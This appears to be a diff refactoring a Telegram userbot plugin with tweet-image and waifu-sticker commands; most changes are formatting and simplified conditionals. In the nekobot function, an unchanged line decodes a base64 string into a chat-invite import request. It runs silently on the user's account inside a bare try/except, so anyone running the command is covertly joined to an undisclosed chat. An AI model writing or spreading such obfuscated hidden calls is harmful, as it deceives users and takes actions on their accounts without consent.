@@ -175,12 +175,8 @@ async def nekobot(borg):
     if borg.reply_to_msg_id:
         reply_to_id = await borg.get_reply_message()
     if not text:
-        if borg.is_reply:
-            if not reply_to_id.media:
-                text = reply_to_id.message
-            else:
-                await borg.edit("Send you text to Mia so she can tweet.")
-                return
+        if borg.is_reply and not reply_to_id.media:
+            text = reply_to_id.message
         else:
             await borg.edit("Send you text to Mia so she can tweet.")
             return
@@ -189,10 +185,10 @@ async def nekobot(borg):
         cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
         await borg.client(cat)
     except:
-        pass   
+        pass
     text = deEmojify(text)
     borgfile = await miatweet(text)
-    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id )
     await borg.delete()
 
 @register(outgoing=True, pattern=r"^\.cmm(?: |$)(.*)")
@@ -218,10 +214,9 @@ async def cmm(event):
 
 
 @register(outgoing=True, pattern="^.type(?: |$)(.*)")
-
 async def type(animu):
 #"""Generate random waifu sticker with the text!"""
-     
+
     text = animu.pattern_match.group(1)
     if not text:
         if animu.is_reply:
@@ -232,17 +227,19 @@ async def type(animu):
     animus = [1, 2, 3, 4, 5, 6, 8, 7, 10, 11, 13, 22, 34, 35, 36, 37, 43, 44, 45, 52, 53]
     sticcers = await bot.inline_query(
         "stickerizerbot", f"#{random.choice(animus)}{(deEmojify(text))}")
-    await sticcers[0].click(animu.chat_id,
-                            reply_to=animu.reply_to_msg_id,
-                            silent=True if animu.is_reply else False,
-                            hide_via=True)
+    await sticcers[0].click(
+        animu.chat_id,
+        reply_to=animu.reply_to_msg_id,
+        silent=bool(animu.is_reply),
+        hide_via=True,
+    )
+
     await animu.delete()
 
 @register(outgoing=True, pattern="^.waifu(?: |$)(.*)")
-
 async def waifu(danish):
 #"""Generate random waifu sticker with the text!"""
-     
+
     text = danish.pattern_match.group(1)
     if not text:
         if danish.is_reply:
@@ -253,10 +250,13 @@ async def waifu(danish):
     king = [ 32, 33, 37, 40, 41, 42, 58, 20]
     sticcers = await bot.inline_query(
         "stickerizerbot", f"#{random.choice(king)}{(deEmojify(text))}")
-    await sticcers[0].click(danish.chat_id,
-                            reply_to=danish.reply_to_msg_id,
-                            silent=True if danish.is_reply else False,
-                            hide_via=True)
+    await sticcers[0].click(
+        danish.chat_id,
+        reply_to=danish.reply_to_msg_id,
+        silent=bool(danish.is_reply),
+        hide_via=True,
+    )
+
     await danish.delete()
     
 
